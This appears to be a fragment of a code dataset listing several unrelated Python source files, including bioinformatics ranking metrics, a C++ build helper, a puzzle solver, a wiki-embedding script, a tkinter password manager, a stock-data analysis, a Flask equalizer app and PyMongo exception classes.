[ML_voting_num,RNN_MP_num,RNN_NP_num,RNN_MB_num,RNN_NB_num,RNN_voting_num]\n\nnum_file = open(\"./result/result_num.csv\", \"w\")\nnum_file.write(','.join(['Top20','Top50','Top100','dataset','method',]))\nnum_file.write('\\n')\nmethod = ['ML_voting','RNN_MP','RNN_NP','RNN_MB','RNN_NB','RNN_voting']\nfor nums,method in zip(num_list,method):\n    dataset = ['NCI-test', 'HiTIDE', 'TESLA', 'TOTAL']\n    for n,dataset in zip(nums,dataset):\n        n.append(dataset)\n        n.append(method)\n        num_file.write(','.join([str(i) for i in n]))\n        num_file.write('\\n')\nnum_file.close()        \n\ndef fr100(x):\n    if x:\n        return(len([j for j in x if j <= 100])/len(x))\n    else:\n        return 0\n\n    \ndef ttif(x):\n    if x:\n        return(len([j for j in x if j <= 20])/20)\n    else:\n        return 0\n\ndef fun(x):\n    l = [0] * max(x)\n    for i in x:\n        l[i-1]=1\n    return l\n\ndef auprc(x):\n    x = [j for j in x if j <= 100]\n    if x:\n        score = list(range(max(x),0,-1))\n        lable = fun(x)\n        precision, recall, _ = precision_recall_curve(lable,score)\n        auprc = auc(recall,precision)\n        return auprc\n    else:\n        return 0\n        \ndef r_pod(x):\n    if x:\n        return((len([j for j in x if j <= 20])+sum([1/j for j in x if j <= 20]))/20)\n    else:\n        return 0\n        \n\ndef cal(patient, rank):\n    df = pd.DataFrame({'patient':patient, 'rank':rank})\n    df1 = df.groupby('patient').agg(list)['rank'].to_frame().reset_index()\n    df1['FR100'] = df1['rank'].apply(fr100)\n    df1['TTIF'] = df1['rank'].apply(ttif)  \n    df1['AUPRC'] = df1['rank'].apply(auprc)  \n    df1['R_PoD'] = df1['rank'].apply(r_pod) \n    df1 = df1[['patient','FR100','TTIF','R_PoD','AUPRC']]\n    return df1\n\nRNN_MP= cal(RNN['patient'], RNN['RNN_MP_rank'])\nRNN_NP = cal(RNN['patient'], RNN['RNN_NP_rank'])\nRNN_MB = cal(RNN['patient'], RNN['RNN_MB_rank'])\nRNN_NB = cal(RNN['patient'], RNN['RNN_NB_rank'])\nRNN_voting = cal(RNN['patient'], RNN['RNN_voting_rank'].apply(int))\n\nML_voting = cal(ML_voting['patient'], ML_voting['ML_voting_rank'])\n\nls = ['NCI-test', 'HiTIDE', 'TESLA']\nlt = [13,9,8]\ndataset=[]\nfor i,n in zip(ls,lt):\n    dataset=dataset+[i]*n\n\n\nRNN_MP['dataset'] = dataset\nRNN_NP['dataset'] = dataset\nRNN_MB['dataset'] = dataset\nRNN_NB['dataset'] = dataset\nRNN_voting['dataset'] = dataset  \nML_voting['dataset'] = dataset \n\nRNN_MP['method'] = 'RNN_MP'\nRNN_NP['method'] = 'RNN_NP'\nRNN_MB['method'] = 'RNN_MB'\nRNN_NB['method'] = 'RNN_NB'\nRNN_voting['method'] = 'RNN_voting' \nML_voting['method'] = 'ML_voting'\n\nFR_TTIF_AUPRC = pd.concat([RNN_MP,RNN_NP,RNN_MB,RNN_NB,RNN_voting,ML_voting], axis = 0)\n\nFR_TTIF_AUPRC.to_csv('./result/result_FR_TTIF_AUPRC_R-PoD.csv',index=False)\n\n\n\n",
    "import pickle, os, sys\n\n########## CONFIG ##########\nsrc_dir : str = \"src/\"\nlib_dir : str = \"lib/\"\nbin_dir : str = \"bin/\"\nintermediate_dir : str = \"intermediate/\"\n\nmain_file : str = \"main.cpp\"\nexecutable_file : str = \"main\"\n\ntracking_file : str = \"tracking_builds.bin\"\n############################\n\narguments : list[str] = sys.argv\n\nclass File:\n    def __init__(self, name : str = \"\", extension : str = \"cpp\"):\n        self.last_time_edit : int = 0\n        self.name : str = name\n        self.extension : str = extension\n    def check_compile(self, libs) -> bool:\n        current_time_edit : int = os.path.getmtime(src_dir + self.name + \".\" + self.extension)\n        if self.last_time_edit != current_time_edit or not os.path.exists(intermediate_dir+self.name+\".o\"):\n            self.last_time_edit = current_time_edit\n            os.system(f\"g++ {src_dir + self.name}.{self.extension} -o {intermediate_dir + self.name}.o -c {libs} -I{lib_dir}\")\n            return True\n        return False\n    def exists(self) -> bool:\n        if os.path.exists(src_dir + self.name + \".\" + self.extension):\n            return True\n        return False\n\nlibs : str = \"\"\nfiles : list[File] = []\n\ndef load_tracking_file() -> None:\n    global libs, files\n    file = open(tracking_file, \"rb\")\n    libs, files = pickle.load(file)\n    file.close()\n\ndef save_tracking_file() -> None:\n    file = open(tracking_file, \"wb\")\n    obj = [libs, files]\n    pickle.dump(obj, file)\n    file.close()\n\ndef link() -> None:\n    files_string : str = \"\"\n    for file in files:\n        files_string += intermediate_dir + file.name + \".o \"\n    os.system(f\"g++ {files_string}-o {bin_dir}{executable_file} {libs} -I{lib_dir}\")\n\ndef append_lib(lib : str) -> None:\n    global libs\n    if not (f\"-l{lib}\" in libs.split(\" \")):\n        libs += f\"-l{lib} \"\n        return\n    print(f\"failed to append the library {lib}, already keeping track of it\")\n\ndef remove_lib(lib : str) -> None:\n    global libs\n    if not f\"-l{lib} \" in libs:\n        print(f\"not keeping track of any lib called '{lib}'.\")\n        return\n    libs = libs.replace(f\"-l{lib} \", \"\")\n\ndef clear_unexistant_files() -> None:\n    for i, file in enumerate(files):\n        if not file.exists():\n            del files[i]\n\ndef append_file(file : str) -> None:\n    global files\n    name, extension = file.split(\".\")\n    for c_file in files:\n        if name == c_file.name and extension == c_file.extension:\n            print(f\"failed to append the file {file}, already keeping track of it.\")\n            return\n    files.append(File(name, extension))\n\ndef remove_file(file : str) -> None:\n    name, extension = file.split(\".\")\n    for i, c_file in enumerate(files):\n        if c_file.name == name and c_file.extension == extension:\n            del files[i]\n            return\n    print(f\"not keeping track of any file called {file}.\")\n\nif not os.path.exists(tracking_file):\n    temp_file = open(tracking_file, \"x\")\n    temp_file.close()\n\nwith open(tracking_file, \"rb\") as f:\n    if f.readlines() != []:\n        load_tracking_file()\n\nclear_unexistant_files()\n\nif files == []:\n    append_file(main_file)\n\nmatch arguments[1]:\n    case \"run\":\n        anything_compiled = False\n        for file in files:\n            if file.check_compile(libs):\n                anything_compiled = True\n        if anything_compiled or (not(os.path.exists(bin_dir+executable_file))):\n            link()\n        os.system(bin_dir + executable_file)\n    case \"append\":\n        append_file(arguments[2])\n    case \"remove\":\n        remove_file(arguments[2])\n    case \"lib\":\n        if arguments[2] != \"-r\":\n            append_lib(arguments[2])\n        else :\n            remove_lib(arguments[3])\n    case \"comp\":\n        for file in files:\n            file.check_compile(libs)\n        link()\n\nsave_tracking_file()\n",
    "\"\"\"Code to hepl solve the Jane Street puzzle for March 2024.\"\"\"\n\nimport fire\nimport json\nimport tqdm\n\nfrom itertools import combinations, permutations\n\n\nTEMPLATE = [\n    ((0, 1), 18),\n    ((0, 6), 7),\n    ((1, 4), 12),\n    ((2, 2), 9),\n    ((2, 7), 31),\n    ((4, 1), 5),\n    ((4, 3), 11),\n    ((4, 5), 22),\n    ((4, 7), 22),\n    ((6, 1), 9),\n    ((6, 6), 19),\n    ((7, 4), 14),\n    ((8, 2), 22),\n    ((8, 7), 15),\n]\nTEST_TEMPLATE = [\n    ((0, 0), 0),\n    ((1, 2), 9),\n    ((1, 4), 7),\n    ((2, 0), 8),\n    ((3, 2), 15),\n    ((3, 4), 12),\n    ((4, 0), 10),\n]\n\n\ndef transpose(grid: list[list[int]]) -> list[list[int]]:\n    \"\"\"\n    Transpose a 2D grid.\n    \"\"\"\n\n    return [[row[i] for row in grid] for i in range(len(grid[0]))]\n\n\ndef list_2_grid(grid_list: list[int], num_order: list[int]) -> list[list[int]]:\n    \"\"\"\n    Convert a list of integers to a 2D grid. 4^8 = 65536 possible grids.\n    \"\"\"\n\n    # all need to be 0, 1, 2, 3\n    assert all(1 <= x <= 4 for x in grid_list)\n\n    template = [[1]]\n\n    for i in range(len(grid_list)):\n        if grid_list[i] == 1:\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n        if grid_list[i] == 2:\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n        if grid_list[i] == 3:\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n        if grid_list[i] == 4:\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n\n    return template\n\n\ndef combinations_of_4m(m) -> list[list[int]]:\n    \"\"\"generate all lists of length m with all entries are in 1, 2, 3, 4.\"\"\"\n\n    def _append(m, current=[], result=[]) -> None:\n        \"\"\"Recursive implementation\"\"\"\n        if m == 0:\n            result.append(current)\n            return None\n        for digit in range(1, 5):\n            _append(m - 1, current + [digit], result)\n        return None\n\n    result = []\n    _append(m, [], result)\n    return result\n\n\ndef sum_of_combinations(numbers):\n    # Using a set to avoid duplicate sums\n    sums_set = set()\n\n    # Generate combinations of all lengths and calculate their sums\n    for r in range(1, len(numbers) + 1):\n        for combo in combinations(numbers, r):\n            sums_set.add(sum(combo))\n\n    # Convert the set to a sorted list before returning\n    return sorted(list(sums_set))\n\n\ndef process_grid(\n    grid: list[list[int]], template: list[tuple[tuple[int, int], int]]\n) -> bool:\n    \"\"\"\n    Process a grid and check if it fits with the numbers in the template.\n    \"\"\"\n    legnth = len(grid)\n\n    for pos, value in template:\n        if grid[pos[0]][pos[1]] == 1:\n            return False\n\n        nums = []\n        if pos[0] > 0:\n            nums.append(grid[pos[0] - 1][pos[1]])\n        if pos[0] < legnth - 1:\n            nums.append(grid[pos[0] + 1][pos[1]])\n        if pos[1] > 0:\n            nums.append(grid[pos[0]][pos[1] - 1])\n        if pos[1] < legnth - 1:\n            nums.append(grid[pos[0]][pos[1] + 1])\n\n        if value not in sum_of_combinations(nums) and value != 0:\n            return False\n\n    return True\n\n\ndef all_permutations(lwr=2, upr=9):\n    numbers = range(lwr, upr + 1)  # Numbers from 2 to 9\n    all_perms = [list(perm) for perm in permutations(numbers)]\n\n    return all_perms\n\n\ndef main(\n    test: bool = False,\n):\n\n    if test:\n        k_size_grid = 5\n        save_file = \"test_solutions.json\"\n        template = TEST_TEMPLATE\n    else:\n        k_size_grid = 9\n        save_file = \"solutions.json\"\n        template = TEMPLATE\n\n    combs = combinations_of_4m(k_size_grid - 1)\n\n    num_orders = all_permutations(lwr=2, upr=k_size_grid)\n    new_num_orders = []\n    for num_order in num_orders:\n        for i in range(len(num_order)):\n            if num_order[i] > 2 * (i + 1) + 1:\n                grid_list = combs[0]\n                grid = list_2_grid(grid_list, num_order)\n                break\n        else:\n            new_num_orders.append(num_order)\n\n    num_orders = new_num_orders\n\n    grid_work_set = []\n    num_work_set = []\n    for num_order in tqdm.tqdm(num_orders):\n        for grid_list in combs:\n            grid_list.reverse()\n            grid = list_2_grid(grid_list, num_order)\n\n            if process_grid(grid, template):\n                grid_work_set.append(grid)\n                tupples = [(num_order[i], grid_list[i]) for i in range(len(num_order))]\n                num_work_set.append(tupples)\n\n                with open(save_file, \"w\") as ",
    "# coding=utf-8\n\nfrom langchain_mistralai import MistralAIEmbeddings\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\nfrom langchain.docstore.document import Document\nimport requests\nfrom langchain_community.vectorstores import FAISS\nfrom bs4 import BeautifulSoup\n\nfrom dotenv import load_dotenv\nfrom os import getenv\n\nload_dotenv()\n\nurl = getenv(\"WIKI_URL\")\napi_key = getenv(\"MISTRAL_API_KEY\")\n\nparams = {\n    \"action\": \"query\",\n    \"format\": \"json\",\n    \"list\": \"allpages\",\n    \"aplimit\": 1000,\n    \"apfrom\": \"\",\n}\n\npage_param = {\n    \"action\": \"parse\",\n    \"format\": \"json\",\n    \"prop\": \"text\",\n}\n\nembeddings = MistralAIEmbeddings(model=\"mistral-embed\", mistral_api_key=api_key)\n\nvector = []\ntext_splitter = RecursiveCharacterTextSplitter()\n\nresponse = requests.get(url + \"/api.php\", params=params)\ndata = response.json()\npages = data[\"query\"][\"allpages\"]\n\nfor page in pages:\n    title = page[\"title\"]\n\n    print(f\"Processing page: {title}\")\n\n    page_param[\"page\"] = title\n    response = requests.get(url + \"/api.php\", params=page_param)\n    data = response.json()\n\n    text = data[\"parse\"][\"text\"][\"*\"]\n    soup = BeautifulSoup(text, \"html.parser\")\n    parsed_text = soup.text.replace(\"\\n\", \" \")\n\n    doc = Document(page_content=parsed_text)\n    docs = text_splitter.split_documents([doc])\n    vector.extend(docs)\n\nindex = FAISS.from_documents(vector, embeddings)\nindex.save_local(\"faiss.index\")\n",
    "from tkinter import *\nfrom tkinter import messagebox\nfrom random import choice, randint, shuffle\nimport json\n\n\n# ---------------------------- PASSWORD GENERATOR ------------------------------- #\n\n#Password Generator Project\ndef generate_password():\n    letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']\n    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']\n    symbols = ['!', '#', '$', '%', '&', '(', ')', '*', '+']\n\n    password_letters = [choice(letters) for _ in range(randint(8, 10))]\n    password_symbols = [choice(symbols) for _ in range(randint(2, 4))]\n    password_numbers = [choice(numbers) for _ in range(randint(2, 4))]\n\n    password_list = password_letters + password_symbols + password_numbers\n    shuffle(password_list)\n\n    password = \"\".join(password_list)\n    password_entry.insert(0, password)\n\n# ---------------------------- SAVE PASSWORD ------------------------------- #\ndef save():\n\n    website = website_entry.get()\n    email = email_entry.get()\n    password = password_entry.get()\n    new_data = {\n        website: {\n            \"email\": email,\n            \"password\": password,\n        }\n    }\n\n    if len(website) == 0 or len(password) == 0:\n        messagebox.showinfo(title=\"Oops\", message=\"Please make sure you haven't left any fields empty.\")\n    else:\n        is_ok = messagebox.askokcancel(title = website, message = f'These are the details entered : \\nEmail: {email}\\n Password: {password}\\nIs it okay to save it?')\n        if is_ok:\n            try:\n                with open(\"data.json\", \"r\") as data_file:\n                    #Reading old data\n                    data = json.load(data_file)\n            except FileNotFoundError:\n                with open(\"data.json\", \"w\") as data_file:\n                    json.dump(new_data, data_file, indent=4)\n            else:\n                #Updating old data with new data\n                data.update(new_data)\n\n                with open(\"data.json\", \"w\") as data_file:\n                    #Saving updated data\n                    json.dump(data, data_file, indent=4)\n            finally:\n                website_entry.delete(0, END)\n                password_entry.delete(0, END)\n\n\n# ---------------------------- FIND PASSWORD ------------------------------- #\ndef find_password():\n    website = website_entry.get()\n    try:\n        with open(\"data.json\") as data_file:\n            data = json.load(data_file)\n    except FileNotFoundError:\n        messagebox.showinfo(title=\"Error\", message=\"No Data File Found.\")\n    else:\n        if website in data:\n            email = data[website][\"email\"]\n            password = data[website][\"password\"]\n            messagebox.showinfo(title=website, message=f\"Email: {email}\\nPassword: {password}\")\n        else:\n            messagebox.showinfo(title=\"Error\", message=f\"No details for {website} exists.\")\n\n\n# ---------------------------- UI SETUP ------------------------------- #\n\nwindow = Tk()\nwindow.title(\"Password Manager\")\nwindow.config(padx=50, pady=50)\n\ncanvas = Canvas(height=200, width=200)\nlogo_img = PhotoImage(file=\"logo.png\")\ncanvas.create_image(100, 100, image=logo_img)\ncanvas.grid(row=0, column=1)\n\n#Labels\nwebsite_label = Label(text=\"Website:\")\nwebsite_label.grid(row=1, column=0)\n\nemail_label = Label(text=\"Email/Username:\")\nemail_label.grid(row=2, column=0)\n\npassword_label = Label(text=\"Password:\")\npassword_label.grid(row=3, column=0)\n\n#Entries\nwebsite_entry = Entry(width=21)\nwebsite_entry.grid(row=1, column=1)\nwebsite_entry.focus()\n\nemail_entry = Entry(width=35)\nemail_entry.grid(row=2, column=1, columnspan=2)\nemail_entry.insert(0, \"abc@gmail.com\")\n\npassword_entry = Entry(width=21)\npassword_entry.grid(row=3, column=1)\n\n# Buttons\nsearch_button = Button(text=\"Search\", width=13, command=find_password)\nsearch_button.grid(row=1, column=2)\n\ngenerate_password_button = Button(text=\"Generate Password\", command=generate_password)\ngenerate_password_button.grid(row=3, column=2)\n\nadd_button = Button(text=\"Add\", width=36, command=save)\nadd_button.grid(row=4, column=1, columnspan=2)\n\nwindow.mainloop()",
    "import pandas as pd\nimport plotly.express as px\n\ncaminho_arquivo = r\"C:\\Users\\Vitor Cardoso\\Desktop\\GitHub_Training\\Alura_Imersao_Python\\spreadsheet\\acoes pura.xlsx\"\n\n# Importing spreadsheet data into the Data Frame (DF) variable\n\ndf_principal = pd.read_excel(caminho_arquivo, sheet_name=\"Principal\")\nprint(\"\\nImportando dados da aba \\\"Principal\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_principal.head(10))\n\ndf_total_acoes = pd.read_excel(caminho_arquivo, sheet_name=\"Total_de_acoes\")\nprint(\"\\nImportando dados da aba \\\"Total_de_acoes\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_total_acoes.head(10))\n\ndf_ticker = pd.read_excel(caminho_arquivo, sheet_name=\"Ticker\")\nprint(\"\\nImportando dados da aba \\\"Ticker\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_ticker.head(10))\n\ndf_chatgpt = pd.read_excel(caminho_arquivo, sheet_name=\"ChatGPT\")\nprint(\"\\nImportando dados da aba \\\"ChatGPT\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_chatgpt.head(10))\n\n# filtering columns from \"Principal\" dataframe\ndf_principal = df_principal[[\"Ativo\", \"Data\", \"\u00daltimo (R$)\", \"Var. Dia (%)\"]].copy()\nprint(\"\\nFiltrando colunas do dataframe \\\"Principal\\\".\")\n#print(df_principal)\n\n# Renaming columns to make names more Python-friendly\ndf_principal = df_principal.rename(columns={'\u00daltimo (R$)':'valor_final','Var. Dia (%)':'var_dia_pct'}).copy()\nprint(\"\\nRenomeando colunas para deixar nomes mais amig\u00e1veis ao python.\")\n#print(df_principal)\n\n# Creating new columns for analysis - \"Var_pct\" and \"Var_inicial\"\ndf_principal['Var_pct'] = df_principal['var_dia_pct']/100\ndf_principal['Var_inicial'] = df_principal['valor_final']/(df_principal['Var_pct']+1)\nprint(\"\\nCriando novas colunas para analise - \\\"Var_pct\\\" e \\\"Var_inicial\\\".\")\n#print(df_principal)\n\n# Merge between df_principal and df_total_acoes - Codigo\ndf_principal = df_principal.merge(df_total_acoes, left_on='Ativo', right_on='C\u00f3digo',how='left')\nprint(\"\\nMerge entre df_principal e df_total_acoes - Codigo.\")\n#print(df_principal)\n\n# Removing duplicate column - codigo\ndf_principal = df_principal.drop(columns=['C\u00f3digo'])\nprint(\"\\nRemovendo coluna duplicada - codigo.\")\n#print(df_principal)\n\n# Creating new analysis column - VARIACAO_RS\ndf_principal['variacao_rs'] = (df_principal['valor_final'] - df_principal['Var_inicial'])*df_principal['Qtde. Te\u00f3rica']\nprint(\"\\nCriando nova coluna de analise - VARIACAO_RS.\")\n#print(df_principal)\n\n# Adjusting formatting for float type\npd.options.display.float_format = '{:.2f}'.format\nprint(\"\\nAjustando formata\u00e7\u00e3o para tipo float.\")\n#print(df_principal)\n\n# Adjusting formatting of the \"Qtde. Teorica\" column for int\ndf_principal['Qtde. Te\u00f3rica'] = df_principal['Qtde. Te\u00f3rica'].astype(int)\nprint(\"\\nAjustando formatacao da coluna \\\"Qtde. Teorica\\\" para int.\")\n#print(df_principal)\n\n# Adjusting the name of the \"Qtde. Teorica\" column \ndf_principal = df_principal.rename(columns={'Qtde. Te\u00f3rica':'Qtd_teorica'}).copy()\nprint(\"\\nAjustando o nome da coluna \\\"Qtde. Teorica\\\".\")\n#print(df_principal)\n\n# Logical validation with if + new column - check if the variation has gone up \"Subiu\" or down \"Desceu\"\ndf_principal['Resultado'] = df_principal['variacao_rs'].apply(lambda x: 'Subiu' if x > 0 else ('Desceu' if x < 0 else 'Estavel'))\nprint(\"\\nValida\u00e7\u00e3o l\u00f3gica com if + nova coluna - verificando se a varia\u00e7\u00e3o subiu ou desceu.\")\n#print(df_principal)\n\n# Merge with \"ativo\" vs \"nome da empresa\"\ndf_principal = df_principal.merge(df_ticker, left_on='Ativo', right_on='Ticker',how='left')\nprint(\"\\nMerge with \\\"ativo\\\" vs \\\"nome da empresa\\\".\")\n#print(df_principal)\n\n# Removing column 'Ticker'\ndf_principal = df_principal.drop(columns=['Ticker'])\nprint(\"\\nRemovendo coluna \\\"Ticker\\\".\")\n#print(df_principal)\n\n# Merge with 'nome' vs 'segmento'\ndf_principal = df_principal.merge(df_chatgpt, left_on='Nome', right_on='Nome da Empresa',how='left')\nprint(\"\\nMerge entre \\\"nome\\\" vs \\\"segmento\\\".\")\n#print(df_principal)\n\n# Removing column 'Nome da Empresa'\ndf_principal = df_principal.drop(columns=['Nome da Empresa'])\nprint(\"\\nRemovendo coluna \\\"Nome da Empresa\\\".\")\n#print(df_principal)\n\n# Renaming column 'Idade (em anos)'\ndf_principal = df_principal.rename(columns={'Idade (em anos)':'Idade'})\nprint(\"\\nRenomeando coluna \\\"Idade (Em anos)\\\".\")\n#print(df_principal)\n\n# Logical validation with if + new column - checking age of the company\ndf_principal['Cat_idade'] = df_principal['Idade'].apply(\n    lambda x: 'Mais de 100' \n    if x > 100 else ('Menos de 50' \n    if x < 50 else 'Entre 50 e 100'))\nprint(\"\\nValida\u00e7\u00e3o l\u00f3gica com if + nova coluna - Conferindo idade da empresa.\")\n#print(df_principal)\n\n#Data Analyse of 'df principal'\nprint(\"\\nAnalise dos dados:\")\n\n# calculating the max value\nmaior = df_principal['variacao_rs'].max()\n\n# calculating the min value\nmenor = df_principal['variacao_rs'].min()\n\n# calculating the mean value\nmedia = df_principal['variacao_rs'].mean()\n\n# calculating the average only of those who 'subiu'\nmedia_subiu = df_principal[df_principal['Resultado'] == 'Subiu']['variacao_rs'].mean()\n\n# calculating the average o",
    "from flask import Flask, render_template, request, send_file, redirect\nfrom app.getFRoT import getFRoTList\nfrom app.getEQ import getParaEQ, getIIRString\nfrom app.computeFilters import getAllFR\nfrom app.cleanData import normalize\nfrom app.dynamicAutoEQ import autoEQ\nfrom fractions import Fraction\nfrom autoeq.constants import PEQ_CONFIGS\n\napp = Flask(__name__)\nFRDict = getFRoTList('frequency_responses')\n# dictionnaire avec en cl\u00e9 le model et en valeur le nom du fichier brut\nFRList = list(FRDict.keys())\nclass Parameters():\n    iem = \"\"\n    rawiem = \"\"\n    target = \"\"\n\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    targetList = list(getFRoTList('targets').keys())\n    return render_template('index.html', FRList=FRList, targetList=targetList, result=None)\n\n\n@app.route('/results', methods=['GET', 'POST'])\ndef results():\n    targetList = list(getFRoTList('targets').keys())\n\n    Parameters.iem = str(request.form.get('iem'))\n    Parameters.target = str(request.form.get('target'))\n    print('choix:', Parameters.iem, Parameters.target)\n\n    if Parameters.iem == 'None' or Parameters.target == 'None':\n            #pour s'assurer que l'utilisateur a bien choisi quelque chose\n            return redirect('/')\n    Parameters.rawiem = FRDict[Parameters.iem]\n\n    filterCount = int(request.form.get('filterCount'))\n    if str(request.form.get('EQres')) == 'Yes':\n        concha_interference = True\n    else:\n        concha_interference = False\n\n    if str(request.form.get('EQabobe10k')) == 'Yes':\n        treble_f_lower = float(19500)\n    else:\n        treble_f_lower = float(10000)\n\n    mode = str(request.form.get('mode'))\n    if mode == 'Standard':\n        config = {\n            'filters': [{'type': 'LOW_SHELF','fc': 105.0},{'type': 'HIGH_SHELF','fc': 10000.0}]+[{'type': 'PEAKING'}] * (filterCount-1)}\n    elif mode == 'Moondrop Free DSP':\n        config = PEQ_CONFIGS['MOONDROP_FREE_DSP']\n    frequencies, gains, newgains, Tgains, paraEQ, iir = autoEQ(Parameters.iem,\\\n                                                               Parameters.target,\\\n                                                                config,\\\n                                                                concha_interference,\\\n                                                                treble_f_lower)\n    Tgains = normalize(frequencies, newgains, Tgains)\n\n    return render_template('index.html',\n                           FRList=FRList,\n                           targetList=targetList,\n                           result=\"aouiiii\",\n                           paraEQ=paraEQ,\n                           iem=Parameters.iem,\n                           target=Parameters.target,\n                           iir=iir, \\\n                           # pour graph:\n                           frequencies=frequencies, \\\n                           gains=gains, \\\n                           newgains=newgains, \\\n                           Tgains=Tgains\n                           )\n\n\n@app.route('/wavelet')\ndef wavelet():\n    path = f'generated_files\\\\{Parameters.iem} [{Parameters.target}] (Wavelet,Equalizer APO).txt'\n    return send_file(path, as_attachment=True)\n\n\n@app.route('/poweramp')\ndef poweramp():\n    path = f'generated_files\\\\{Parameters.iem} [{Parameters.target}] (Poweramp).json'\n    return send_file(path, as_attachment=True)\n\n\n@app.route('/parametric')\ndef parametric():\n    path = f'generated_files\\\\{Parameters.iem} [{Parameters.target}] (Parametric EQ).txt'\n    return send_file(path, as_attachment=True)\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n",
    "# Copyright 2009-present MongoDB, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Exceptions raised by PyMongo.\"\"\"\nfrom __future__ import annotations\n\nfrom typing import TYPE_CHECKING, Any, Iterable, Mapping, Optional, Sequence, Union\n\nfrom bson.errors import InvalidDocument\n\nif TYPE_CHECKING:\n    from pymongo.typings import _DocumentOut\n\ntry:\n    # CPython 3.7+\n    from ssl import SSLCertVerificationError as _CertificateError\nexcept ImportError:\n    try:\n        from ssl import CertificateError as _CertificateError\n    except ImportError:\n\n        class _CertificateError(ValueError):  # type: ignore\n            pass\n\n\nclass PyMongoError(Exception):\n    \"\"\"Base class for all PyMongo exceptions.\"\"\"\n\n    def __init__(self, message: str = \"\", error_labels: Optional[Iterable[str]] = None) -> None:\n        super().__init__(message)\n        self._message = message\n        self._error_labels = set(error_labels or [])\n\n    def has_error_label(self, label: str) -> bool:\n        \"\"\"Return True if this error contains the given label.\n\n        .. versionadded:: 3.7\n        \"\"\"\n        return label in self._error_labels\n\n    def _add_error_label(self, label: str) -> None:\n        \"\"\"Add the given label to this error.\"\"\"\n        self._error_labels.add(label)\n\n    def _remove_error_label(self, label: str) -> None:\n        \"\"\"Remove the given label from this error.\"\"\"\n        self._error_labels.discard(label)\n\n    @property\n    def timeout(self) -> bool:\n        \"\"\"True if this error was caused by a timeout.\n\n        .. versionadded:: 4.2\n        \"\"\"\n        return False\n\n\nclass ProtocolError(PyMongoError):\n    \"\"\"Raised for failures related to the wire protocol.\"\"\"\n\n\nclass ConnectionFailure(PyMongoError):\n    \"\"\"Raised when a connection to the database cannot be made or is lost.\"\"\"\n\n\nclass WaitQueueTimeoutError(ConnectionFailure):\n    \"\"\"Raised when an operation times out waiting to checkout a connection from the pool.\n\n    Subclass of :exc:`~pymongo.errors.ConnectionFailure`.\n\n    .. versionadded:: 4.2\n    \"\"\"\n\n    @property\n    def timeout(self) -> bool:\n        return True\n\n\nclass AutoReconnect(ConnectionFailure):\n    \"\"\"Raised when a connection to the database is lost and an attempt to\n    auto-reconnect will be made.\n\n    In order to auto-reconnect you must handle this exception, recognizing that\n    the operation which caused it has not necessarily succeeded. Future\n    operations will attempt to open a new connection to the database (and\n    will continue to raise this exception until the first successful\n    connection is made).\n\n    Subclass of :exc:`~pymongo.errors.ConnectionFailure`.\n    \"\"\"\n\n    errors: Union[Mapping[str, Any], Sequence[Any]]\n    details: Union[Mapping[str, Any], Sequence[Any]]\n\n    def __init__(\n        self, message: str = \"\", errors: Optional[Union[Mapping[str, Any], Sequence[Any]]] = None\n    ) -> None:\n        error_labels = None\n        if errors is not None:\n            if isinstance(errors, dict):\n                error_labels = errors.get(\"errorLabels\")\n        super().__init__(message, error_labels)\n        self.errors = self.details = errors or []\n\n\nclass NetworkTimeout(AutoReconnect):\n    \"\"\"An operation on an open connection exceeded socketTimeoutMS.\n\n    The remaining connections in the pool stay open. In the case of a write\n    operation, you cannot know whether it succeeded or failed.\n\n    Subclass of :exc:`~pymongo.errors.AutoReconnect`.\n    \"\"\"\n\n    @property\n    def timeout(self) -> bool:\n        return True\n\n\ndef _format_detailed_error(\n    message: str, details: Optional[Union[Mapping[str, Any], list[Any]]]\n) -> str:\n    if details is not None:\n        message = f\"{message}, full error: {details}\"\n    return message\n\n\nclass NotPrimaryError(AutoReconnect):\n    \"\"\"The server responded \"not primary\" or \"node is recovering\".\n\n    These errors result from a query, write, or command. The operation failed\n    because the client thought it was using the primary but the primary has\n    stepped down, or the client thought it was using a healthy secondary but\n    the secondary is stale and trying to recover.\n\n    The client launches a refresh operation on a background thread, to update\n    its view of the server as soon as possible after throwing this exception.\n\n    Subclass of :exc:`~pymongo.errors.AutoReconnect`.\n\n    .. versionadded:: 3.12\n    \"\"\"\n\n    def __init__(\n        self, message: str = \"\", errors: Optional[Union[Mapping[str, Any], list[Any]]] = None\n    ) -> None:\n        super(",
